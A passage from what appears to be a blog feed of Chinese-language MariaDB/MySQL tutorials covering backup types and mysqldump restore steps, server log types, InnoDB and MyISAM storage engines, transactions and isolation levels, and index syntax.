    <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>完全备份：备份整个数据集合</p><p>增量备份：仅备份最近一次完全备份或增量备份以来变化的数据</p><p>差异备份：仅备份最近一次完全备份以来变化的数据</p><a id="more"></a><p>热备份：备份过程中读写操作均可执行</p><p>温备份：读操作可执行，但写操作不能执行</p><p>冷备份：读写操作均不可执行</p><p>物理备份：直接复制数据文件进行备份，还原快，但是占空间大</p><p>逻辑备份：从数据库中“导出”数据另存而进行的备份，即导出sql语句，与存储引擎无关，还原慢但是占空间小</p><h3 id="备份工具"><a href="#备份工具" class="headerlink" title="备份工具"></a>备份工具</h3><p>mysqldump：逻辑备份工具，适用于所有存储引擎，支持温备、完全备份、部分备份；对InnoDB存储引擎支持热备</p><p>cp，tar：物理备份工具，复制归档工具，适用于所有存储引擎，只支持冷备、完全备份、部分备份</p><p>lvm2快照：几乎热备(需要锁拍快照)，借助于文件系统管理工具进行备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH TABLES WITH READ LOCK;</span><br></pre></td></tr></table></figure><p>mysqlhotcopy：几乎冷备，仅适用于MyISAM存储引擎</p><p>xtrabackup：支持InnoDB热备(物理备份)，支持完全备份、增量备份</p><h3 id="逻辑备份"><a href="#逻辑备份" class="headerlink" title="逻辑备份"></a>逻辑备份</h3><p>该备份方式会将schema和数据存储在一起，这样会导致巨大的SQL语句，会形成巨大的单个备份文件。</p><h4 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h4><p>连接至mysql服务器后通过全量扫描进行备份。</p><p>mysqldump备份innodb表时因为要加–single-transaction，会自动将隔离级别设置为repeatable read并开启一个事务，这时mysqldump将获取dump执行前一刻的行版本，并处于一个长事务中直到dump结束。所以不影响目标数据库的使用，可读也可写，即实现的是热备。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#备份数据库下的所有表，不包含数据库自身</span></span><br><span class="line">mysqldump [option] db_name [tbl_name...]</span><br><span class="line"><span class="comment">#备份指定数据库，包含数据库自身和其内的所有表</span></span><br><span class="line">mysqldump [option] --databases db_name...</span><br><span class="line"><span class="comment">#备份所有库，同上</span></span><br><span class="line">mysqldump [option] --all-databases</span><br><span class="line"></span><br><span class="line"><span class="comment">#其他option</span></span><br><span class="line">-E,--events：备份指定数据库相关的所有event schedule</span><br><span class="line">-R,--routines：备份指定数据库相关的所有存储过程和存储函数</span><br><span class="line">--triggers：备份表相关的触发器</span><br></pre></td></tr></table></figure><p>对于MyISAM引擎来说，只支持温备；需要锁定备份库后启动备份操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#锁定方法</span></span><br><span class="line">-x,--lock-all-tables：锁定所有库的所有表</span><br><span class="line">-l,--lock-tables：锁定指定数据库的所有表</span><br></pre></td></tr></table></figure><p>对于InnoDB来说，支持热备，但只支持比较小的数据库备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--single-transaction：启动单个巨大事务来备份</span><br><span class="line">--master-data=2：热备的那个一刻，二进制日志处于的位置，并备份出来用CHANGE MASTER TO语句标记，2是备份时候自动注释掉，恢复时候不被执行；</span><br><span class="line">1：记录为CHANGE MASTER TO语句，此语句不被注释；</span><br><span class="line">2：记录为CHANGE MASTER TO语句，此语句被注释；</span><br><span class="line">--flush-logs：锁定表完成后，即进行日志滚动操作，备份时候，重新生成一个二进制日志文件用于备份恢复；</span><br></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#热备hellodb数据库示例，使用mysqldump+二进制日志完成全量+增量备份</span></span><br><span class="line">mysqldump -uroot -pxxx --single-transaction -R -E --triggers  --master-data=2 --flush-logs  --databases hellodb &gt; /root/hellodb-fullback-$(date +%F).sql</span><br><span class="line"><span class="comment">#热备所有数据库</span></span><br><span class="line">mysqldump -uroot -pxxx --single-transaction -R -E --triggers  --master-data=2 --flush-logs  --all-databases  &gt; /root/alldb-fullback-$(date +%F).sql</span><br><span class="line"><span class="comment">#查看二进制日志位置</span></span><br><span class="line">less /root/alldb-fullback-2018-10-24.sql</span><br><span class="line">.......MASTER_LOG_FILE=<span class="string">'master-log.000001'</span>,MASTER_LOG_POS=245;</span><br><span class="line"><span class="comment">#备份恢复</span></span><br><span class="line">cp alldb-fullback-2018-10-24.sql  /tmp/  <span class="comment">#拷贝备份文件</span></span><br><span class="line">cp master-log.000001 /root  <span class="comment">#拷贝二进制日志文件</span></span><br><span class="line">mysqlbinlog master-log.000001  <span class="comment">#读取二进制日志文件</span></span><br><span class="line">mysqlbinlog master-log.000001 &gt; /tmp/binlog.sql  <span class="comment">#把读的结果重定向到指定目录下</span></span><br><span class="line"><span class="comment">#进入数据库</span></span><br><span class="line">mysql </span><br><span class="line"> SET @@session.sql_log_bin=OFF; <span class="comment">#关闭二进制日志</span></span><br><span class="line">\ ./alldb-fullback-2018-10-24.sql <span class="comment">#读取备份文件恢复数据库</span></span><br><span class="line">\ ./binlog.sql <span class="comment">#读取二进制文件生成的备份文件恢复数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意</span></span><br><span class="line">dump前会滚动二进制日志，这样只需要备份新的二进制日志即可</span><br></pre></td></tr></table></figure><h3 id="物理备份"><a href="#物理备份" class="headerlink" title="物理备份"></a>物理备份</h3><h4 id="xtrabackup"><a href="#xtrabackup" class="headerlink" title="xtrabackup"></a>xtrabackup</h4><p>待完善</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt;完全备份：备份整个数据集合&lt;/p&gt;
&lt;p&gt;增量备份：仅备份最近一次完全备份或增量备份以来变化的数据&lt;/p&gt;
&lt;p&gt;差异备份：仅备份最近一次完全备份以来变化的数据&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-日志</title>
    <link href="http://yoursite.com/2020/02/23/mariadb-%E6%97%A5%E5%BF%97/"/>
    <id>http://yoursite.com/2020/02/23/mariadb-%E6%97%A5%E5%BF%97/</id>
    <published>2020-02-23T08:40:25.000Z</published>
    <updated>2020-02-23T08:42:10.223Z</updated>
    
    <content type="html"><![CDATA[<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>查询日志：query log</p><p>慢查询日志：slow query log</p><p>错误日志：error log</p><a id="more"></a><p>二进制日志：binary log</p><p>中继日志：relay log</p><p>事务日志：transaction log</p><h3 id="查询日志"><a href="#查询日志" class="headerlink" title="查询日志"></a>查询日志</h3><p>记录查询操作，可以记录在文件中，也可以记录在数据库表当中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#是否开启查询日志，一般不开启，压力太大</span><br><span class="line">general_log&#x3D;ON|OFF</span><br><span class="line">#以文件为记录时的文件名，一般为主机名</span><br><span class="line">general_log_file&#x3D;HOSTNAME.log</span><br><span class="line">#日志输出格式，可以为文件或表</span><br><span class="line">log_output&#x3D;TABLE|FILE|NONE</span><br></pre></td></tr></table></figure><h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>执行时长超出指定时长的查询操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#查找指定时长变量</span><br><span class="line">show global variables like &#39;long_query_time&#39;;</span><br><span class="line">#可以select来查询该变量</span><br><span class="line">select @@global.long_query_time;</span><br><span class="line"></span><br><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#是否开启慢查询日志</span><br><span class="line">slow_query_log&#x3D;ON|OFF</span><br><span class="line">#慢查询日志存放位置</span><br><span class="line">slow_query_log_file&#x3D;HOSTNAME-slow.log</span><br><span class="line">#慢查询日志记录速率</span><br><span class="line">log_slow_rate_limit&#x3D;1</span><br><span class="line">#慢查询日志记录级别</span><br><span class="line">log_slow_verbosity</span><br><span class="line"></span><br><span class="line">#注意</span><br><span class="line">使用select时，@@表示查询全局变量，@表示查询用户变量</span><br></pre></td></tr></table></figure><h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h3><p>mysqld启动和关闭过程中输出的事件信息；mysqld运行中产生的错误信息；event scheduler运行一个event时产生的日志信息；在主从复制架构中的从服务器上启动从服务器线程时产生的日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#存放路径</span><br><span class="line">log_error&#x3D;&#x2F;var&#x2F;log&#x2F;mariadb&#x2F;mariadb.log</span><br><span class="line">#是否记录警告信息至错误日志中</span><br><span class="line">log_warning&#x3D;1|0</span><br></pre></td></tr></table></figure><h3 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h3><p>导致数据改变或可能导致数据改变的SQL语句。通过”重放“日志文件中的事件来生成数据副本。</p><p>对于事务表的操作，二进制日志只在事务提交的时候一次性写入(基于事务的innodb二进制日志)，提交前的每个二进制日志记录都先cache，提交时写入。对于非事务表的操作，每次执行完语句就直接写入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#显示已使用的二进制文件日志</span><br><span class="line">show mysql logs;</span><br><span class="line">#查看正在使用中的二进制日志文件</span><br><span class="line">show master status;</span><br><span class="line">#查看日志</span><br><span class="line">show binlog events [in &#39;log_name&#39;] [from pos] [limit [offset,] row_count];</span><br><span class="line"></span><br><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#是否启用二进制日志</span><br><span class="line">log_bin&#x3D;ON|OFF</span><br><span class="line">sql_logbin&#x3D;ON|OFF</span><br><span class="line">#记录文件位置，通常为OFF，使用滚动方式记录</span><br><span class="line">log_bin&#x3D;&#x2F;PATH&#x2F;TO&#x2F;file</span><br><span class="line">#二进制日志格式</span><br><span class="line">binlog_format&#x3D;STATEMENT|ROW|MIXED</span><br><span class="line">#单个二进制文件最大值，默认为1G；到达最大值后会自动滚动</span><br><span class="line">max_binlog_size&#x3D;1073741824</span><br><span class="line">#日志过期时长，0为不启用</span><br><span class="line">expire_logs_days&#x3D;0</span><br><span class="line">#设置是否启用二进制日志同步功能，即事务提交时同步到磁盘</span><br><span class="line">sync_binlog&#x3D;1|0</span><br></pre></td></tr></table></figure><h4 id="记录格式"><a href="#记录格式" class="headerlink" title="记录格式"></a>记录格式</h4><p>基于“语句”记录：statement</p><p>基于“行”记录：row</p><p>混合模式：mixed，让系统自行判定基于哪种方式</p><h4 id="日志构成"><a href="#日志构成" class="headerlink" title="日志构成"></a>日志构成</h4><p>日志文件：mysql-bin.文件名后缀，二进制格式</p><p>索引文件：mysql-bin.index，文本格式，表示哪些二进制日志在使用</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询二进制日志的命令工具</span></span><br><span class="line">mysqlbinlog [option] bin_log_file</span><br><span class="line">--start-position：指定事件起始位置</span><br><span class="line">--stop-position：指定事件结束位置</span><br><span class="line">--start-datetime：指定事件开始时间</span><br><span class="line">--stop-datetime：指定事件结束时间</span><br></pre></td></tr></table></figure><h3 id="中继日志"><a href="#中继日志" class="headerlink" title="中继日志"></a>中继日志</h3><p>复制架构中，从服务器用于保存从主服务器的二进制日志中读取到的事件。</p><h3 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h3><p>帮助事务存储引擎满足ACID测试，由存储引擎自行管理和使用。一般分为redo log和undo log。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查找log参数变量</span><br><span class="line">show global variables like &#39;%log%&#39;;</span><br><span class="line">#事务日志存放位置</span><br><span class="line">innodb_log_group_home_dir&#x3D;.&#x2F;</span><br><span class="line">#事务日志文件一组有几个</span><br><span class="line">innodb_log_files_in_group&#x3D;2</span><br><span class="line">#每个事务日志文件大小</span><br><span class="line">innodb_log_file_size&#x3D;5242880</span><br></pre></td></tr></table></figure><h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>通常是物理日志，记录的是数据页的物理修改，而不是某一行或某几行修改成怎样，它用来恢复提交后的物理数据页(恢复数据页，且只能恢复到最后一次提交的位置)。</p><p>redo log包括两部分：一是内存中的日志缓冲(redo log buffer)，该部分日志是易失性的；二是磁盘上的重做日志文件(redo log file)，该部分日志是持久的。</p><p>在概念上，innodb通过force log at commit机制实现事务的持久性，即在事务提交的时候，必须先将该事务的所有事务日志写入到磁盘上的redo log file和undo log file中进行持久化。</p><p>执行流程通常是先将原始数据从磁盘中读入内存中来，修改数据的内存拷贝；然后生成一条重做日志并写入redo log buffer，记录的是数据被修改后的值；当事务commit时，将redo log buffer中的内容刷新到 redo log file，对 redo log file采用追加写的方式；最后定期将内存中修改的数据刷新到磁盘中。</p><p>为了确保每次日志都能写入到事务日志文件中，在每次将log buffer中的日志写入日志文件的过程中都会调用一次操作系统的fsync操作(即fsync()系统调用)。因为MariaDB/MySQL是工作在用户空间的，MariaDB/MySQL的log buffer处于用户空间的内存中。要写入到磁盘上的log file中(redo:ib_logfileN文件,undo:share tablespace或.ibd文件)，中间还要经过操作系统内核空间的os buffer，调用fsync()的作用就是将OS buffer中的日志刷到磁盘上的log file中。</p><h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>undo log有两个作用：提供回滚和多个行版本控制(MVCC)。</p><p>在数据修改的时候，不仅记录了redo，还记录了相对应的undo，如果因为某些原因导致事务失败或回滚了，可以借助该undo进行回滚。</p><p>undo log和redo log记录物理日志不一样，它是逻辑日志。可以认为当delete一条记录时，undo log中会记录一条对应的insert记录，反之亦然，当update一条记录时，它记录一条对应相反的update记录。</p><p>当执行rollback时，就可以从undo log中的逻辑记录读取到相应的内容并进行回滚。有时候应用到行版本控制的时候，也是通过undo log来实现的：当读取的某一行被其他事务锁定时，它可以从undo log中分析出该行记录以前的数据是什么，从而提供该行版本信息，让用户实现非锁定一致性读取。</p><p>undo log是采用段(segment)的方式来记录的，每个undo操作在记录的时候占用一个undo log segment。另外，undo log也会产生redo log，因为undo log也要实现持久性保护。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h3&gt;&lt;p&gt;查询日志：query log&lt;/p&gt;
&lt;p&gt;慢查询日志：slow query log&lt;/p&gt;
&lt;p&gt;错误日志：error log&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-存储引擎、事务</title>
    <link href="http://yoursite.com/2020/02/22/mariadb-%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E3%80%81%E4%BA%8B%E5%8A%A1/"/>
    <id>http://yoursite.com/2020/02/22/mariadb-%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E3%80%81%E4%BA%8B%E5%8A%A1/</id>
    <published>2020-02-22T11:19:25.000Z</published>
    <updated>2020-02-22T11:21:53.653Z</updated>
    
    <content type="html"><![CDATA[<h3 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>存储引擎是表类型级别的概念，每张表都可以指定使用什么存储引擎。</p><a id="more"></a><h4 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h4><h5 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h5><ul><li><p>用于处理大量短期事务</p></li><li><p>支持行级锁</p></li><li><p>能够实现崩溃后自动恢复</p></li><li><p>数据存储于”表空间”，可以理解为一个建立在文件系统之上的另一个InnoDB专用的文件系统。另外，即使使用一个空的磁盘，且该磁盘不创建文件系统，InnoDB也可以在其上创建表空间进行工作。</p><ul><li>可以将所有的InnoDB表和索引放置于同一个表空间中，但是这样不利于备份且数据混乱。存放于/var/lib/mysql/ibdata1文件中。</li><li>可以每个表单独使用一个表空间存储表的数据和索引，在配置文件的mysqld字段开启：innodb_file_per_table=ON。此时数据文件存放在该表目录下名为tbl_name.idb，表格式文件存放在tbl_name.frm文件中</li></ul></li><li><p>支持MVCC来实现高并发，支持所有的四个隔离级别，默认为REPEATABLE READ；支持间隙锁防止幻读出现</p></li><li><p>使用聚集索引</p></li><li><p>支持“自适应hash索引”、预读操作、插入缓冲区来提高性能</p></li><li><p>支持热备</p></li></ul><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><h5 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h5><ul><li>支持全文索引、压缩表</li><li>不支持事务，不支持行级锁，支持表级锁(容易出现竞争态)</li><li>崩溃后无法正常恢复</li><li>适用于只读(写操作较少)、表较小的数据库</li><li>支持延迟更新索引键</li></ul><h5 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h5><p>tbl_name.frm：表格式定义文件</p><p>tbl_name.MYD：数据文件</p><p>tbl_name.MYI：索引文件</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看存储引擎</span><br><span class="line">show engines;</span><br><span class="line">#查看表状态，可以查看使用什么存储引擎</span><br><span class="line">show table status;</span><br></pre></td></tr></table></figure><h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><p>一组原子性的SQL查询，或者说是一个独立的工作单元，必须满足ACID测试。他们要么全部执行(失败全部回滚)，要么全部不执行，它需要依赖事务日志文件实现崩溃后恢复。</p><h4 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h4><p>A：atomicity，原子性。整个事务中的所有操作要么全部执行，要么全部失败后回滚。</p><p>C：consistency，一致性。数据库总是从一个一致性状态转换为另一个一致性状态。</p><p>I：isolation，隔离性。一个事务所作出的操作在提交之前，是不能为其他所见；隔离有多种级别。</p><p>D：durability，持久性。一旦事务提交，其所做的修改会永久保存于数据库中。</p><h4 id="savepoint"><a href="#savepoint" class="headerlink" title="savepoint"></a>savepoint</h4><p>如果有一系列比较长的操作，但是执行到某一点时执行错了想要回滚，但是如果这时候执行了ROLLBACK那么前面一系列的指令都会全部回滚，效率十分低下。鉴于这种情况，在某条指令后使用savepoint命令创建保存点，那么下次回滚时会回滚到指定保存点的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#创建保存点</span><br><span class="line">SAVEPOINT point_name;</span><br><span class="line"></span><br><span class="line">#回滚指定保存点</span><br><span class="line">ROLLBACK To point_name;</span><br><span class="line"></span><br><span class="line">#清除保存点</span><br><span class="line">RELEASE SAVEPOINT point_name;</span><br></pre></td></tr></table></figure><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>启动事务：START TRANSACTION</p><p>结束事务：有两种情况；COMMIT提交和ROLLBACK回滚</p><p>注意，默认情况下mysql启动autocommit来实现每个命令自动当作事务进行提交，因此建议关闭autocommit，手动显示请求和提交事务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看是否开启自动提交</span><br><span class="line">show global variables like &#39;%auto%&#39;;</span><br><span class="line">#设置为0，即禁用自动提交</span><br><span class="line">set global autocommit&#x3D;0;</span><br></pre></td></tr></table></figure><h4 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h4><p>隔离级别过高可能会导致阻塞其他事务访问，因此提出隔离级别的概念</p><p>具有四个隔离级别：</p><p>READ-UNCOMMITTED：读未提交，具有脏读、不可重复读、幻读问题</p><p>READ-COMMITTED：读提交，具有不可重复读、幻读问题</p><p>REPEATABLE READ：可重读，默认innodb采用此隔离级别，具有幻读问题</p><p>SERIALIZABILE：可串行化，当前有事务执行时会阻塞其他事务(安全性高，但是几乎无法并行)</p><p>可能存在问题：</p><p>脏读：读到别人没提交的数据，即数据被回滚</p><p>不可重复读：在一次事务中读到不同的数据，即在一次事务中其他人进行了修改</p><p>幻读：为了保证可重读，即使读的数据已被其他人修改，但是在自己的一次事务中仍然认为是原来的样子(即使已经发现被修改，但是为了可重复读必须当作未修改)</p><p>加锁读：要读的数据加锁，别人无法读</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查看访问mysql的进程</span><br><span class="line">show processlist;</span><br><span class="line">#查看隔离相关参数tx_isolation</span><br><span class="line">show global varibles like &#39;%isolat%&#39;</span><br><span class="line">#修改参数tx_isolation为最低等级，可能会出现脏读、幻读、不可重复读</span><br><span class="line">set tx_isolation&#x3D;&#39;READ-UNCOMMITTED&#39;;</span><br></pre></td></tr></table></figure><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><p>两个或多个事务在同一资源相互占用，并请求锁定对方占用的资源的状态。</p><h4 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h4><p>保证事务能够回滚、持久。每个写操作都先写到事务日志中 (磁盘上的连续空间)，而不是写到数据文件中，因此避免了大量的随机IO。写操作为追加方式，因此其操作为顺序IO。这种日志被称为预写日志。通常该日志在磁盘上有两个，一个写满后写另一个，同时将写满的事务日志进行执行(默认为ib_logfile0|1，大小为5MB)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查询日志相关参数，可以修改事务日志文件大小</span><br><span class="line">show global variables like inno%log%&#39;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;存储引擎&quot;&gt;&lt;a href=&quot;#存储引擎&quot; class=&quot;headerlink&quot; title=&quot;存储引擎&quot;&gt;&lt;/a&gt;存储引擎&lt;/h3&gt;&lt;h4 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h4&gt;&lt;p&gt;存储引擎是表类型级别的概念，每张表都可以指定使用什么存储引擎。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mariadb" scheme="http://yoursite.com/categories/mariadb/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="mariadb" scheme="http://yoursite.com/tags/mariadb/"/>
    
      <category term="存储引擎" scheme="http://yoursite.com/tags/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>mariadb-索引</title>
    <link href="http://yoursite.com/2020/02/22/mariadb-%E7%B4%A2%E5%BC%95/"/>
    <id>http://yoursite.com/2020/02/22/mariadb-%E7%B4%A2%E5%BC%95/</id>
    <published>2020-02-22T06:12:35.000Z</published>
    <updated>2020-02-22T11:22:03.766Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基本法则"><a href="#基本法则" class="headerlink" title="基本法则"></a>基本法则</h3><p>索引应该被构建在经常被用作查询条件的字段上。</p><a id="more"></a><h3 id="相关语句"><a href="#相关语句" class="headerlink" title="相关语句"></a>相关语句</h3><h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE  [UNIQUE | FULLTEXT | SPATIAL]  INDEX  索引名 ON  表名(字段名) [USING 索引方法];</span><br><span class="line">#或者</span><br><span class="line">ALTER TABLE 表名 ADD [UNIQUE | FULLTEXT | SPATIAL]  INDEX | KEY  [索引名] (字段名1 [(长度)] [ASC | DESC]) [USING 索引方法]；</span><br></pre></td></tr></table></figure><h4 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看指定表的索引</span><br><span class="line">show index from 表名;</span><br></pre></td></tr></table></figure><h4 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DROP INDEX 索引名 ON 表名</span><br><span class="line">#或者</span><br><span class="line">ALTER TABLE 表名 DROP INDEX 索引名</span><br></pre></td></tr></table></figure><h3 id="索引类型"><a href="#索引类型" class="headerlink" title="索引类型"></a>索引类型</h3><h4 id="B-Tree索引"><a href="#B-Tree索引" class="headerlink" title="B+ Tree索引"></a>B+ 